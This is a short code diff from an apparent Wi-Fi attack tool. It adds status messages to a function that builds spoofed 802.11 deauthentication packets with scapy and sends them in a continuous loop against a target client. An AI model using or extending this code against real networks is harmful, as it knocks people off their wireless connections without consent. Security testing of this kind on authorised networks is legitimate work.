@@ -35,8 +35,11 @@ def begin_deauth(ap_mac, target_mac, interface):
             # Import scapy modules inside the function to avoid circular imports
             from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
             # Build deauth packet
+            
+            _push_status(f"building deauth packet")
             pkt = RadioTap()/Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)/Dot11Deauth()
             
+            _push_status(f"deauth packet built, entering send loop")
             while not stop_event.wait(1.0):
                 try:
                     # Send deauth packets continuously
